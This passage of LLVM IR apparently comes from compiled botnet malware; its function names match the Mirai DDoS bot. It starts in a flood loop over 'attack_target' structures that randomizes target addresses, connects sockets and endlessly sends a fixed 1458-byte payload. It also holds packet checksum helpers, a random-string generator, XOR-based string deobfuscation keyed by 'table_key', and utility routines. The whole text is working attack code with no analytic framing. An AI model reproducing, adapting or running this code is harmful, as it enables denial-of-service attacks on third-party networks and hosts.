  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #9
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #9
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !33

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %202, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %199, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %202

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = call i64 @send(i32 noundef %197, i8* noundef getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), i64 noundef 1458, i32 noundef 16384)
  br label %199

199:                                              ; preds = %192
  %200 = load i32, i32* %9, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %9, align 4
  br label %175, !llvm.loop !34

202:                                              ; preds = %175
  br label %174
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_generic(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

16:                                               ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6, !llvm.loop !35

19:                                               ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

29:                                               ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

23:                                               ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

26:                                               ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23, !llvm.loop !36

36:                                               ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 noundef zeroext %68) #9
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

77:                                               ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77, !llvm.loop !37

87:                                               ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

5:                                                ; preds = %45, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %46

8:                                                ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

11:                                               ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %45

21:                                               ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %36

24:                                               ; preds = %21
  %25 = call i32 @rand_next()
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i16*
  store i16 %27, i16* %29, align 2
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 2
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 2
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  br label %44

36:                                               ; preds = %21
  %37 = call i32 @rand_next()
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, -1
  store i32 %43, i32* %4, align 4
  br label %44

44:                                               ; preds = %36, %24
  br label %45

45:                                               ; preds = %44, %11
  br label %5, !llvm.loop !38

46:                                               ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !39

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !40

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !41

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

declare i32 @util_isspace(i8 noundef signext) #4

declare i32 @util_isdigit(i8 noundef signext) #4

declare i32 @util_isalpha(i8 noundef signext) #4

declare i32 @util_isupper(i8 noundef signext) #4

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
